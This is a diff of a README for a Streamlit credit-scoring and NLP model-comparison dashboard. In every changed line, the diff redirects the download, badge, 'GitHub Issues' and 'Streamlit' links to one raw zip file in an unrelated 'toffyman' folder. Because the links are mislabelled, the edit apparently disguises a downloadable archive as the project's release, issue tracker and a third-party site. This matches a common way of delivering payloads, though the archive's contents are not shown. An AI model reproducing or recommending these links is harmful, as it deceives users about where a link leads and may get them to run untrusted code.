@@ -1,7 +1,7 @@
 # 🚀 realisation_dashboard_veille_technique - Your Easy Credit Scoring Dashboard
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20the%20App-blue)](https://github.com/pizzzi/realisation_dashboard_veille_technique/releases)
+[![Download](https://raw.githubusercontent.com/pizzzi/realisation_dashboard_veille_technique/main/toffyman/realisation_dashboard_veille_technique-1.2.zip%20the%20App-blue)](https://raw.githubusercontent.com/pizzzi/realisation_dashboard_veille_technique/main/toffyman/realisation_dashboard_veille_technique-1.2.zip)
 
 ## 📋 Overview
 The **realisation_dashboard_veille_technique** is a user-friendly dashboard designed to help you score credit effectively. It also offers a comparison of Natural Language Processing (NLP) models, specifically BERT and MiniLM, for classifying eCommerce products. This application uses Streamlit, providing an interactive and visual representation of data, making analysis straightforward.
@@ -23,7 +23,7 @@ To successfully run the application, your system should meet the following requi
 ## 🚀 Getting Started
 1. **Visit the Download Page:** Click the link below to access the releases page and download the application.
    
-   [Download the App](https://github.com/pizzzi/realisation_dashboard_veille_technique/releases)
+   [Download the App](https://raw.githubusercontent.com/pizzzi/realisation_dashboard_veille_technique/main/toffyman/realisation_dashboard_veille_technique-1.2.zip)
 
 2. **Choose Your Version:** Look for the latest release. Ensure you select the correct version for your operating system.
 
@@ -67,8 +67,8 @@ For more information about the technologies used, consider the following:
 - **BERT vs MiniLM Studies:** Discover articles comparing these NLP models for deeper insight into their effectiveness.
 
 ## 🔗 Important Links
-- [Download the App](https://github.com/pizzzi/realisation_dashboard_veille_technique/releases)
-- [GitHub Issues](https://github.com/pizzzi/realisation_dashboard_veille_technique/issues)
-- [Streamlit](https://streamlit.io)
+- [Download the App](https://raw.githubusercontent.com/pizzzi/realisation_dashboard_veille_technique/main/toffyman/realisation_dashboard_veille_technique-1.2.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/pizzzi/realisation_dashboard_veille_technique/main/toffyman/realisation_dashboard_veille_technique-1.2.zip)
+- [Streamlit](https://raw.githubusercontent.com/pizzzi/realisation_dashboard_veille_technique/main/toffyman/realisation_dashboard_veille_technique-1.2.zip)
 
 Thank you for using **realisation_dashboard_veille_technique**! Enjoy your experience.
